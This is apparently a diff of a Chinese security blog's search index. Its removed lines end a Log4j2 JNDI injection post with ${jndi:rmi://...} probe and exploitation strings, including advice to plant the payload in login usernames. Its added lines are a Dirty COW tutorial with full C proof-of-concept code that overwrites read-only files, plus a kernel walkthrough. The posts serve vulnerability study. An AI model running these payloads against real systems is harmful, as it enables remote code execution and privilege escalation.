class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>测试：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p>
-<p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p>
-<p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p>
-<h2 id="漏洞探测">漏洞探测</h2>
-<p>修改测试代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>foei54.dnslog.cn为我们在dnslog平台得到的url</p>
-<p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p>
-<p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>修改测试代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p>
-<p>效果：</p>
-<p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p>
-<p>可以看到命令被成功执行了</p>
-<p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p>
-<p>参考：</p>
-<p><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p>
-<p><a href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p>
-<p><a href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>
 ]]></content>
       <categories>
         <category>JAVA</category>
@@ -876,57 +876,160 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
-    <title>seafile和alist使用体验</title>
-    <url>/post/seafile%E5%92%8Calist%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[<h3 id="背景">背景</h3>
-<p>家里有一台十年前的空闲主机，处理器是赛扬j1900，主板是梅捷SY-1900，平时没怎么使用，正好主板上空着一个sata2接口的硬盘位，就想着废物利用，搭建一个属于自己的<strong>私人网盘</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/b714094e70284d59a3211d8279c39bdb.jpg" alt="b714094e70284d59a3211d8279c39bdb.jpg"  /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="seafile">seafile</h3>
-<p>一开始只对seafile有了解，所以没有考虑其他的网盘系统就直接开始搭建seafile了，seafile的部署和使用比较简单，在win7上部署可以参考下面这位大佬的文章（要自己去获取seafile-server_5.0.3_win32.tar.gz的资源）</p>
-<p><a href="https://blog.csdn.net/wwwwestcn/article/details/122424469">https://blog.csdn.net/wwwwestcn/article/details/122424469</a></p>
-<p>seafile在windows上的搭建方法比较简单，整个过程没有遇到什么太难的问题，接下来就我自己的体验来谈谈seafile的优缺点</p>
-<p>优点：</p>
-<p>​    1.支持<strong>多平台客户端</strong>访问、连手机都有专业的app</p>
-<p>​    2.对本地储存的数据进行了<strong>加密</strong>、无法在本地进行查看（这一点因人而异，我认为是优点）</p>
-<p>​    3.访问时必须要输入密码，提高了数据的安全性</p>
-<p>缺点：</p>
-<p>​    1.大于30M的数据只能下载<strong>不能在线预览</strong>，想要线上看视频基本上是不可能的了（这是后来换alist的主要原因）</p>
-<p>​    2.windows版本的<strong>服务端</strong>已经停止更新了，只能自己去找老的版本下载</p>
-<p>​    3.配置有些复杂，访问是用的8000端口、上传是用的8082端口，意味着进行端口转发或者配置反代理服务器的时候需要同时对两个端口进行操作</p>
-<p><img src="https://img-blog.csdnimg.cn/17f9bc567d1d42b9b38de90751182d38.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h3 id="alist">alist</h3>
-<p>发现seafile的缺点以后，就一直在找其他支持预览大体积文件的私人网盘系统，最终看到了其他博主搭建的alist网盘，发现对预览视频大小没有限制就开始部署alist了</p>
-<p>alist的部署更加简单，具体可以看这位博主的文章</p>
-<p><a href="https://blog.csdn.net/weixin_43957923/article/details/128045524">Alist搭建_「已注销」的博客-CSDN博客_alist搭建教程</a></p>
-<p>同样讲一下alist的优缺点</p>
-<p>优点：</p>
-<p>​    1.搭建简单、配置也不麻烦、页面简易美观</p>
-<p>​    2.支持大体积文件的在线预览、不用下载也能观看</p>
-<p>缺点：</p>
-<p>​    1.没有客户端工具只能通过网页端访问资源</p>
-<p>​    2.默认内容对所有访问用户开放、隐私的内容和相关密码需要自己配置</p>
-<p>​    3.可以通过图片视图大致预览图片列表、希望视频也能有个封面查看</p>
-<p>​    4.有点“重”，内容多的话要加载很久</p>
-<p>这里alist的缺点很多，主要也是因为用alist的体验比较久，但目前来说我对alist的使用是比较满意的，并且alist还支持和百度网盘、阿里网盘、onedrive等知名网盘的联动</p>
-<h3 id="alist的安全问题">alist的安全问题</h3>
-<p>利用黑暗搜索引擎对含有alist的特征网页进行搜索</p>
-<p><img src="https://img-blog.csdnimg.cn/d8e57c2b9ad746fabebceedd38332d81.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到搜索结果多达一万多条，说明使用alist的用户群还是比较大的，而alist搭建过程中如果管理员没有进行特殊配置的话，所上传的内容是默认对所有访客用户开放的，也就是说你上传的文件没有经过隐私处理就直接暴露在了公网上的话，所有人都可以看到你的文件，如果此时又挂载了百度网盘等其他云储存服务，那么这些网盘中的内容也同样是对外开放的，而这些网盘一般都有同步手机信息、相册、聊天记录等功能，所以极易造成个人隐私泄漏</p>
-<p><img src="https://img-blog.csdnimg.cn/c811906dc6474fadbf5ef3751dee8221.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>（上图是搜索结果中随意点开的一个网页，可以看到网页挂载了很多的网盘，网盘里的内容所有人可见）</p>
-<p>为了防止这种隐私泄漏，我们需要对隐私文件进行<strong>加密或隐藏</strong>，加密方法在alist的说明文档中有</p>
-<p><a href="https://alist.nn.ci/zh/guide/advanced/meta.html">元信息 | AList文档 (nn.ci)</a></p>
-<p>同时也可以参考下面这位up主的视频</p>
-<p><a href="https://b23.tv/IYeqcm6">【Alist】Alist的四大功能使用教程_哔哩哔哩_bilibili</a></p>
-<h3 id="最后">最后</h3>
-<p>搭建私人网盘一定要注意个人信息不被泄露，最好不要直接暴露在公网上，想要访问的话可以通过内网穿透工具实现。</p>
+    <title>linux提权之dirtycow</title>
+    <url>/post/linux%E6%8F%90%E6%9D%83%E4%B9%8Bdirtycow/</url>
+    <content><![CDATA[<p>Dirty COW（脏牛）漏洞是一种影响Linux操作系统的本地特权升级漏洞，其全称为&quot;Copy-On-Write&quot;（写时复制）漏洞。这个漏洞在2016年被公开，并且影响了大量的Linux内核版本。</p>
+<p>Dirty  COW漏洞的根本原因是<code>Linux在竞态条件下的复制时写入（Copy-On-Write）机制的实现存在缺陷</code>。Copy-On-Write是一种内存管理技术，它允许多个进程共享同一个物理内存页面的副本，直到其中一个进程尝试修改该页面时，系统才会复制出一个新的页面供修改进程使用。</p>
+<p><code>竞态条件（Race Condition）</code>是多个并发操作或线程访问共享资源时可能出现的一种问题。竞态条件发生在多个操作之间存在依赖关系，并且操作的执行顺序会影响最终的结果。</p>
+<p>听起来似乎比较复杂，我们可以简单一点</p>
+<p>假设有一个变量a</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;dirty&quot;</span></span><br></pre></td></tr></table></figure>
+<p>同时还有另一个变量b</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">b=a</span><br></pre></td></tr></table></figure>
+<p>尽管这是两个变量，但它们都指向同一个内存对象，因为不需要为相同的值占用两倍的内存量。但如果修改了b变量，操作系统就会为这个变量分配单独的内存。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">b+=<span class="string">&quot;cow&quot;</span></span><br></pre></td></tr></table></figure>
+<p>修改时，内核执行了一下操作：</p>
+<ol>
+<li>
+<p>为新修改的变量分配内存</p>
+</li>
+<li>
+<p>读取正在复制的对象的原始内容</p>
+</li>
+<li>
+<p>对它执行任何必要的更改，即附加“cow”</p>
+</li>
+<li>
+<p>将修改后的内容写入新分配的内存空间</p>
+</li>
+</ol>
+<p>在步骤 2 和 4 之间存在竞态条件，会使内存映射器将修改后的内容写入原始内存空间，而不是新分配的空间。这样，我们最终会修改 <code>a</code>这个 原始对象而不是  <code>b</code>，即使我们只有  <code>a</code>的只读权限，仍然可以通过竞态条件绕过。</p>
+<p>接下来我们可以通过一个小实验来理解这个过程</p>
+<h1 id="开始实验">开始实验</h1>
+<p>本实验的目标是使用 Dirty Cow 漏洞修改只读文件。</p>
+<p>首先通过root创建一个其他人都只能读的只读文件test.txt</p>
+<p><img src="image-20231223164736506.png" alt="image-20231223164736506"></p>
+<p>接着通过gcc编译一下代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f=open(<span class="string">&quot;test.txt&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>,<span class="string">&quot;dirty&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *content= <span class="string">&quot;cow&quot;</span>;</span><br><span class="line">    <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line">    <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        lseek(f, offset, SEEK_SET);</span><br><span class="line">        write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">            madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现文件内容被我们给修改了</p>
+<p><img src="image-20231223181826083.png" alt="image-20231223181826083"></p>
+<h1 id="分析代码">分析代码</h1>
+<p>首先简单看一下主函数代码，在这之前，我们得先了解linux中的Page Cache</p>
+<h2 id="Page-Cache">Page Cache</h2>
+<p>在Linux中，<code>Page Cache（页缓存）</code>是一种用于加速文件系统性能的内核机制。Page Cache是一种缓存，它将磁盘上的文件数据以页的形式缓存在内存中，以便快速响应对文件的读取和写入操作。</p>
+<p>当进程通过系统调用读取文件时，Linux内核会尝试从Page Cache中查找相应的数据。如果数据已经缓存在Page Cache中，内核可以直接将数据返回给进程，避免了从磁盘读取的开销，从而提高读取性能。</p>
+<p>同样地，当进程进行写入操作时，内核会将数据写入Page Cache，并将数据标记为<code>已修改（dirty）</code>。然后，内核会根据一定的策略将这些修改的数据异步地刷新回磁盘，以确保数据持久化。这种延迟写入的方式可以提高写入性能，减少频繁的磁盘IO操作。</p>
+<h2 id="mmap">mmap</h2>
+<p>其中，<code>mmap()</code>是一个系统调用函数，用于在进程的虚拟地址空间中创建一个新的内存映射区域。它可以将文件或其他资源映射到进程的内存中，也可以用于创建匿名的、仅在内存中存在的映射区域。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</span><br></pre></td></tr></table></figure>
+<p><code>mmap()</code>函数接受六个参数：</p>
+<ul>
+<li>
+<p><code>addr</code>：映射区域的首选地址。通常传入<code>NULL</code>，让操作系统自动选择一个合适的地址。</p>
+</li>
+<li>
+<p><code>length</code>：映射区域的长度（以字节为单位）。</p>
+</li>
+<li>
+<p><code>prot</code>：内存保护标志，指定映射区域的访问权限。常见的选项有：<code>PROT_READ</code>：可读。<code>PROT_WRITE</code>：可写。<code>PROT_EXEC</code>：可执行。</p>
+</li>
+<li>
+<p><code>flags</code>：映射选项标志，用于控制映射区域的行为。常见的选项有：</p>
+<ul>
+<li><code>MAP_SHARED</code>：与其他进程共享映射的文件或资源。</li>
+<li><code>MAP_PRIVATE</code>：创建私有的映射区域，对其所做的修改不会影响原始文件或资源。</li>
+<li><code>MAP_ANONYMOUS</code>：创建匿名的映射区域，不与文件关联，仅在内存中存在。</li>
+</ul>
+</li>
+<li>
+<p><code>fd</code>：要映射的文件描述符，如果创建匿名映射，则为-1。</p>
+</li>
+<li>
+<p><code>offset</code>：映射的文件中的偏移量，通常为0。</p>
+</li>
+</ul>
+<p>mmap创建的内存映射就是将磁盘文件的内容放到了Page Cache里。</p>
+<h2 id="主函数">主函数</h2>
+<p>这段代码一共创建了三个线程，主线程、writeThread 和 madviseThread，主线程创建了私有的映射区域并将我们的文件映射到内存，找到我们要替换的内容的位置，然后创建两个线程来产生竞态条件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> pth1, pth2; <span class="comment">// 声明两个线程标识符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span> <span class="comment">// 声明一个stat结构体变量，用于获取文件的状态信息</span></span><br><span class="line">    <span class="type">int</span> file_size; <span class="comment">// 声明一个整数变量，用于存储文件大小</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;test.txt&quot;</span>, O_RDONLY); <span class="comment">// 打开一个名为&quot;test.txt&quot;的文件，以只读方式打开，并返回文件描述符</span></span><br><span class="line"></span><br><span class="line">    fstat(f, &amp;st); <span class="comment">// 获取文件的状态信息，将结果存储在st结构体中</span></span><br><span class="line">    file_size = st.st_size; <span class="comment">// 获取文件的大小，赋值给file_size变量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>); <span class="comment">// 将文件映射到内存中，返回映射区的起始地址，存储在map指针中</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;dirty&quot;</span>); <span class="comment">// 在映射区中搜索字符串&quot;dirty&quot;，返回第一次出现的位置的指针，存储在position指针中</span></span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span> *)file_size); <span class="comment">// 创建一个线程，执行madviseThread函数，并将file_size作为参数传递</span></span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position); <span class="comment">// 创建另一个线程，执行writeThread函数，并将position作为参数传递</span></span><br><span class="line"></span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>); <span class="comment">// 等待线程pth1的结束</span></span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>); <span class="comment">// 等待线程pth2的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="madviseThread">madviseThread</h2>
+<p>然后是madviseThread，在这之前先了解一下madvise函数</p>
+<p><code>madvise()</code>是一个系统调用函数，用于向操作系统提供有关内存映射区域使用方式的提示信息。它的原型如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">madvise</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> advice)</span>;</span><br></pre></td></tr></table></figure>
+<p><code>madvise()</code>函数接受三个参数：</p>
+<ul>
+<li><code>addr</code>：指向欲操作的内存区域的起始地址。</li>
+<li><code>length</code>：欲操作的内存区域的长度（以字节为单位）。</li>
+<li><code>advice</code>：对内存区域使用方式的提示信息，使用<code>MADV_*</code>常量之一。</li>
+</ul>
+<p><code>madvise()</code>函数的常用选项（<code>advice</code>参数）如下：</p>
+<ul>
+<li>
+<p><code>MADV_NORMAL</code>：默认选项，没有特殊提示。</p>
+</li>
+<li>
+<p><code>MADV_RANDOM</code>：内存区域将以随机访问方式使用。</p>
+</li>
+<li>
+<p><code>MADV_SEQUENTIAL</code>：内存区域将以顺序访问方式使用。</p>
+</li>
+<li>
+<p><code>MADV_WILLNEED</code>：预先告知操作系统，内存区域将很快被使用，建议提前加载至内存。</p>
+</li>
+<li>
+<p><code>MADV_DONTNEED</code>：告知操作系统，内存区域的内容不再需要，可以被丢弃或回收。</p>
+</li>
+<li>
+<p><code>MADV_REMOVE</code>：从内存中删除映射区域，但保留文件内容。</p>
+</li>
+<li>
+<p><code>MADV_DONTFORK</code>：禁止映射区域被子进程继承。</p>
+</li>
+</ul>
+<p>madviseThread函数：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> file_size = (<span class="type">int</span>)arg; <span class="comment">// 获得传进来的文件大小</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED); <span class="comment">//告诉操作系统，该内存区域的内容不再需要，可以被丢弃或回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>madviseThread要干的事非常简单，就是不断丢弃映射内容的副本页，这将导致<code>指向副本页的页表项被清除</code></p>
+<h2 id="writeThread">writeThread</h2>
+<p>再来看看writeThread</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *content = <span class="string">&quot;cow&quot;</span>; <span class="comment">// 要写入内存的内容</span></span><br><span class="line">    <span class="type">off_t</span> offset = (<span class="type">off_t</span>)arg; <span class="comment">// 要写入的内存偏移量，将void指针参数转换为off_t类型</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> f = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR); <span class="comment">// 以可读写方式打开当前进程的内存文件</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 将文件指针移动到之间查找到“dirty”的位置</span></span><br><span class="line">        lseek(f, offset, SEEK_SET);</span><br><span class="line">        <span class="comment">// 向内存写入数据</span></span><br><span class="line">        write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>writeThread</code>函数将指定的内容（“cow”）通过<code>/proc/self/mem</code>写入内存，诶？这里似乎出现了一个问题，我们之前通过mmap返回的内存映射不是只读的吗？那这里对该位置尝试写入能写成功吗？而且就算写成功，写的也是内存映射中的内容，和原来的本地磁盘上的内容有什么联系？不急，我们接着往下看</p>
+<h2 id="缺页中断">缺页中断</h2>
+<p>这里先讲讲linux的缺页中断</p>
+<p>Linux的缺页中断处理方式大致可以分为以下几个步骤：</p>
+<ol>
+<li>中断处理程序（Interrupt Handler）：当发生缺页中断时，CPU会暂停当前进程的执行，并转交控制权给内核的中断处理程序。这个中断处理程序负责保存当前进程的上下文，并进行后续的缺页中断处理。</li>
+<li>查询页表：中断处理程序首先会查询当前进程的页表，以确定引发缺页中断的虚拟地址所对应的页表项。如果页表项不存在或标记为无效，说明该页面尚未映射到物理内存，需要进行页面调入。</li>
+<li>页面调入：当发现虚拟页面尚未映射到物理内存时，内核会触发页面调入操作。它会选择一个物理页面（可能需要从磁盘读取）来存储该虚拟页面的数据，并进行必要的页面映射更新。</li>
+<li>更新页表：页面调入后，内核会更新当前进程的页表，将虚拟地址与物理地址进行映射。这样，进程可以继续访问该页面，而不会再触发缺页中断。</li>
+<li>恢复进程执行：完成页面调入和页表更新后，内核会恢复中断处理程序保存的当前进程上下文，并将控制权返回给进程。进程可以继续执行之前被中断的指令，访问所需的页面。</li>
+</ol>
+<p>了解完之后我们开始分析整个过程（初略的讲一下，具体的代码逻辑可以看<a href="https://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">blingblingxuanxuan的文章</a>）</p>
+<h2 id="第一次缺页中断">第一次缺页中断</h2>
+<p>首先在主函数调用完mmap之后将文件内容以只读的形式映射到了内存中，然而相应的页表还未来得及建立</p>
+<p>writeThread进程通过虚拟地址尝试访问这个页，但页表为空，触发缺页中断，不同的情况有不同的处理方式，而这里发生缺页以后，内核根据根据访问flags（FOLL_WRITE，写请求）和mmap类型（VM_PRIVATE，私有映射区域），在物理内存上将page_cache做了一份拷贝（COW），也就是创建一个新的物理页（称为副本页），然后将原始页的内容拷贝到新的物理页中，并使用副本页建立页表，映射给进程使用（联系到之前的例子，对b进行修改，内核拷贝了一份新的地址给b）。同时标记页表为<code>只读RO</code>和<code>脏页dirty</code></p>
+<h2 id="第二次缺页中断">第二次缺页中断</h2>
+<p>解决完问题，writeThread继续尝试写操作，当查找页表时，发现所请求的页表项被标记为只读（read-only），但是进程试图对该页进行写操作，Linux 的处理方式是将写意图（write intent）去掉，即<code>FOLL_WRITE=0</code>，同时会复制一份新的内存区域，并将这份新的内存区更新到页表中，并将这份新的内存区域的权限设置为可写，内核重新执行引发页面错误的那条指令。</p>
+<p>正常情况下，程序拿到新的页表项找到物理内存就可以开始做写操作了，这个写操作是在新的内存页中操作的，和原来的内存页中无关（类似于修改了b，但和a无关）</p>
+<p>诶！！！好巧不巧，正好此时madviseThread执行到madvice函数，释放了对应的虚拟内存空间，把这个页表的存在位清空了。</p>
+<h2 id="第三次缺页中断">第三次缺页中断</h2>
+<p>之前writeThread本应拿到的页表项被madviseThread给清空了，所以又发生了缺页中断，和第一次一样，只不过这一次由于访问flags（FOLL_WRITE=0），认为没有写意图，就直接返回page cache这个物理内存以建立页表关系，所以writeThread就这样拿到了对应着page cache的页表项，并通过<code>kmap()</code>映射绕过mmap映射的读写限制，完成强制写内存</p>
+<h2 id="page-cache写回">page cache写回</h2>
+<p>page cache的数据标记为已修改（dirty），就会通过page cache写回机制覆盖调原有的磁盘文件，至此，仅可读文件被成功修改。</p>
+<p>上述所有的流程都是只在一次for循环中完成的，过程可参考一下流程图</p>
+<p><img src="image-20231223231058051.png" alt="image-20231223231058051"></p>
+<h1 id="修复">修复</h1>
+<p>linux增加了一个FOLL_COW属性，第二次缺页中断后FOLL_WRITE不会置为0，而是加上一个<code>FOLL_COW</code>的属性，这样第三次的缺页中断FOLL_WRITE依旧等于1</p>
+<p>参考：</p>
+<p><a href="https://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/">经典内核漏洞复现之 dirtycow</a></p>
